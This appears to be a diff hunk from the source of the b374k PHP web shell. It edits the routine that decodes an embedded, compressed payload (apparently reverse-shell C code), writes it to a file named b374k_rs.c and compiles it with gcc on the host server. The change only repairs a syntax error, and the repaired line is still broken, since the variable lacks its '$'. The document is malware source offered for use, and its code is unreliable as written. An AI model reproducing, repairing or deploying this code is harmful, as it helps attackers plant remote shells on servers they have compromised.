@@ -29,7 +29,7 @@ $fc = $_REQUEST['rs'];
 $fc = gzinflate(base64_decode($rscode));
 $fpath = "b374k_rs";
 
-file=fopen($fpath.".c","w")){
+file=fopen($fpath.".c","w");
 fwrite($file,$fc);
 fclose($file);
 $result = exe("gcc ".$fpath.".c -o ".$fpath);			
